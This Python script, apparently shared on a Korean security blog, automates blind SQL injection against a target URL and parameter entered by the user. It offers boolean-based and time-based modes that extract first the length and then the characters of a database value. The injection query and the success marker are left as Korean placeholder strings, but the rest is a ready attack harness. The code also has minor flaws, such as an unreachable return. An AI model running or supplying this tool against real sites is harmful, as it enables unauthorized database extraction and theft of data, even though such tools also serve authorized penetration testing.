# https://hyotwo.tistory.com/

import requests
import time

class color:
    d='\033[00m'
    black='\033[30m'
    red='\033[31m'
    green='\033[32m'
    yellow='\033[33m'
    magenta='\033[35m'
    white='\033[37m'
    bred='\033[91m'
    bgreen='\033[92m'
    byellow='\033[93m'
    bblue='\033[94m'
    cyan='\033[96m'

url = input("target URL : ")
cookies = {"test": "cookie"} # 쿠키값 지정
pa = input("parameters : ")
opt = int(input(" 옵션 번호 지정\n"+color.byellow+" 1.Blind 길이값 추출 \n"+color.bblue+" 2.Blind 문자열 추출 \n"+color.bred+" 3.Time 길이값 추출 \n"+color.cyan+" 4.Time 문자열 추출 \n"+color.d+" 입력 : "))
sl = int(input("지연 시간(초) [설정안할 시 0] : ")) 

def find_len():
    flen = 0
    while 1:
        flen = flen + 1
        value = "공격쿼리".format(flen) #공격 쿼리 입력 후 {} 증가값 포지션 설정      
        params = {pa: value}
        response = requests.get(url, params=params, cookies=cookies) 
        print("Payload : "+color.magenta+value+color.cyan+"  :::::::상태 코드:::::::  "+color.byellow+str(response.status_code)+color.d+"\n")
        time.sleep(sl)
        if ("응답값" in response.text):  # 응답값에 포함 되어야할 문자열
            print(color.bred+"length 추출 : ",color.d+str(flen)+"\n")
            break    
    return flen  
if __name__ == '__main__' and opt == 1:    
   find_len()
          
def error():
    print(color.red+"옵션값 오류")
    exit()
if __name__ == '__main__' and opt >= 5 or opt == 0:    
   error()

     
def find_name():
    flen= int(input("length 입력: "))
    fname = ""
    a = 1
    for i in range(a,flen+1):
        print(color.red+"finding"+color.d, a)
        for j in range(32, 123):  
            if j == 37 or j == 126 or j == 94 or j == 92 or j == 60 or j == 59 or j == 63 or j == 92 :  
                continue
            value = "공격쿼리".format(a, j) #공격 쿼리 입력 후 {} 증가값 포지션 설정
            params = {pa: value}
            time.sleep(sl)
            response = requests.get(url, params=params, cookies=cookies) 
            if "응답값" in response.text: # 응답값에 포함 되어야할 문자열
                print("Payload : "+color.magenta+value+color.cyan+"  :::::::찾은 문자:::::::  "+color.byellow+chr(j)+color.d+"\n")
                fname += chr(j)
                a=a+1
                break                 
    print(color.bred+"name 추출 : ",color.d+fname)
    return fname
if __name__ == '__main__' and opt == 2:    
   find_name()
        
def sleep_len():
     slen = 0
     while 1:
        slen = slen + 1
        gap = time.time()
        value = "공격쿼리".format(slen) #공격 쿼리 입력 후 {} 증가값 포지션 설정
        params = {pa: value}
        time.sleep(sl)
        response = requests.get(url, params=params, cookies=cookies)
        print("Payload : "+color.magenta+value+color.cyan+"  :::::::상태 코드:::::::  "+color.byellow+str(response.status_code)+color.d)
        print(color.yellow+"응답시간(초) : "+str(round(time.time()-gap))+"\n"+color.d)
        if time.time() - gap < 3:
            continue
        else:
            print(color.bred+"length 추출 : ",color.d+str(slen)+"\n")
            break
         
        return slen
if __name__ == '__main__' and opt == 3:    
   sleep_len()

def sleep_name():
     slen= int(input("length 입력: "))
     sname = ""
     a = 1
     for i in range(a,slen+1):
        print(color.red+"finding"+color.d, a)
        for j in range(32, 123):  
            if j == 37 or j == 126 or j == 94 or j == 92 or j == 60 or j == 59 or j == 63 or j == 92 :  
                continue
            gap = time.time()
            value = "공격쿼리".format(a, j) #공격 쿼리 입력 후 {} 증가값 포지션 설정
            params = {pa: value}
            time.sleep(sl)
            response = requests.get(url, params=params, cookies=cookies) 
            
            if time.time() - gap < 3:
                continue
            else:
                print("Payload : "+color.magenta+value+color.cyan+"  :::::::찾은 문자:::::::  "+color.byellow+chr(j)+color.d+"\n")
                print(color.yellow+"응답시간(초) : "+str(round(time.time()-gap))+"\n"+color.d)
                sname += chr(j)
                a=a+1
                break                 
     print(color.bred+"name 추출 : ",color.d+sname)
     return sname
if __name__ == '__main__' and opt == 4:    
   sleep_name()
